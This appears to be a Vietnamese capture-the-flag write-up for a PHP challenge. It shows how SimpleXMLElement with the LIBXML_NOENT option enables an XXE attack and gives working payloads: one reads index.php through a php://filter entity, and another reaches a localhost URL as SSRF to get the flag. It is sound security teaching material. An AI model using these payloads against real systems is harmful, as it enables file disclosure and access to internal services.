# Solution


Bài cho phép ta tạo một instance của một class có sẵn trong php và gọi `echo`. `echo` sẽ trigger function `__toString` của class đó.

Viết script để tìm các built-in class có method `__toString`:

```php
$declared_classes = get_declared_classes();

foreach ($declared_classes as $cls){
    if(method_exists($cls, '__toString'))
    {
        echo "FOUND: " . $cls. "\n";
    }
}
```

Ở cuối ta sẽ thấy `SimpleXMLElement`, tìm trên php.net sẽ thấy class này có phương thức khởi tạo như sau:

```
public SimpleXMLElement::__construct(
    string $data,
    int $options = 0,
    bool $dataIsURL = false,
    string $namespaceOrPrefix = "",
    bool $isPrefix = false
)
```

và ở bài này ta được truyền vào hai tham số là `$data` và `$options`

method `__toString` có chức năng parse các element và trả về text bên trong nó:

```php
<?php
$xml = new SimpleXMLElement('<a>1 <b>2 </b>3</a>');
echo $xml;
?>

The above example will output:

1 3
```

quay lại với `__contruct` ở tham số `$options` có một điều đáng lưu ý:

```
LIBXML_NOENT (int)
Substitute entities
Caution
Enabling entity substitution may facilitate XML External Entity (XXE) attacks.
```

-> trigger XXE


vậy payload:

```
echo new SimpleXMLElement("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'> ]> <a>&xxe;</a>", 2);
```

ở đây ta gửi đi `2` là dạng int của `LIBXML_NOENT`.

sau khi đọc được source file `index.php` thì tiếp theo là SSRF để đọc flag

```
echo new SimpleXMLElement("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php'> ]> <a>&xxe;</a>", LIBXML_NOENT);
```